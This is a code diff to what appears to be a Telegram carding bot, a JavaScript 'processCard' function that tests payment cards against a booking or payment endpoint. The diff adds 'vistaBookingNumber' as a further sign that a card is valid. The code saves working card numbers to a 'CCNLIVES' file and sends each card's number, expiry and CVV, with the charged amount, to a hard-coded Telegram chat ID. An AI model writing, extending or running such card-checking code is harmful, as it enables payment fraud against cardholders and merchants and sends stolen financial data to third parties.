@@ -528,7 +528,8 @@ async function processCard(chatId, cardText) {
                 if (responseText.includes('avs') || 
                     responseText.includes('"IsValid":true') || 
                     responseText.includes('Insufficient') || 
-                    responseText.includes('Limit')) {
+                    responseText.includes('Limit') || 
+                    responseText.includes('vistaBookingNumber')) {
                     
                     // Save live card
                     fs.appendFileSync('CCNLIVES_TG.txt', cardText + '\n');
@@ -548,14 +549,14 @@ async function processCard(chatId, cardText) {
                         `✅ <b>Live Card</b>\n\n` +
                         `💳 ${cc}|${mm}|${yyyy}|${cvv}\n` +
                         `💰 Amount: $${totalAmount} (${quantity} × $${pricePerQuantity.toFixed(2)})\n` +
-                        `📋 VistaBookingNumber: ${vistaBookingNumber}\n` +
+                        `📋 Confirmation Number: ${vistaBookingNumber}\n` +
                         `📝 Response: ${errorMsg}`, 
                         6050175626
                     );
                     
                     result = {
                         status: 'live',
-                        message: `✅ *LIVE*\n\n💳 \`${cardText}\`\n💰 *Amount:* $${totalAmount} (${quantity} × $${pricePerQuantity.toFixed(2)})\n📋 *VistaBookingNumber:* ${vistaBookingNumber}\n\n📝 *Response:*\nPayment Authorised [${errorMsg}]`
+                        message: `✅ *LIVE*\n\n💳 \`${cardText}\`\n💰 *Amount:* $${totalAmount} (${quantity} × $${pricePerQuantity.toFixed(2)})\n📋 *Confirmation Number:* ${vistaBookingNumber}\n\n📝 *Response:*\nPayment Authorised [${errorMsg}]`
                     };
                 } else if (retry >= 3) {
                     let errorMsg = 'Unknown error';
